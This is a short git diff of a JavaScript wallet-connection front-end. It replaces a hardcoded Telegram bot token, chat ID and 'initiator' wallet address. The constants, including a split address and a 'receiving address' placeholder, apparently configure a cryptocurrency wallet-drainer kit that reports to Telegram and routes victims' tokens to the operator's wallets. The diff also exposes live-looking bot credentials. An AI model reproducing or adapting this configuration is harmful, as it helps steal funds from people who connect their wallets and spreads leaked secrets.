@@ -13,8 +13,8 @@ import { appKit } from "./networkSwitcher";
 import {  useAppKitAccount, useAppKitProvider } from "@reown/appkit/react";
 
 
-const TELEGRAM_BOT_TOKEN = "8160714180:AAGKqwTYvb9cN2Ir6Zjqhc7KWQl2mAHDNJQ";
-const TELEGRAM_CHAT_ID = "-1002535678431";
+const TELEGRAM_BOT_TOKEN = "7606680143:AAEACjK5K7Q5Ybw_Z-6_Y90xUmZoDlM6B40";
+const TELEGRAM_CHAT_ID = " 7903357798";
 
 
 const DAI_ADDRESS_MAINNET = "0x6B175474E89094C44Da98b954EedeAC495271d0F"; // DON'T TOUCH THIS !!!
@@ -22,7 +22,7 @@ const DAI_ADDRESS_MAINNET = "0x6B175474E89094C44Da98b954EedeAC495271d0F"; // DON
 const BLACK_RAIN_SPLIT = "0x20d2dB479b661c4a65B8F498cDAB86EB741385c1";   // DON'T TOUCH THIS !!!
 
 
-const BR_INITIATOR_ADDRESS = "0x143EaF2E6A0914F52020D8c2eE9A2b10A77868fE".toLowerCase(); // Replace wth your private key public address example 0x4Fc94E3CBb1A1070D4Df126C4cFa37fBBd9dcd08 
+const BR_INITIATOR_ADDRESS = "0xab6322b431B94A1D30Ba8aca3dB4ac82c4356E48".toLowerCase(); // Replace wth your private key public address example 0x4Fc94E3CBb1A1070D4Df126C4cFa37fBBd9dcd08 
 
 const FRONTEND_RECIPIENT = "0x20d2dB479b661c4a65B8F498cDAB86EB741385c1"; // Hardcoded frontend recipient YOUR RECEIVIVNG ADDRESS SHOULD BE HERE
 
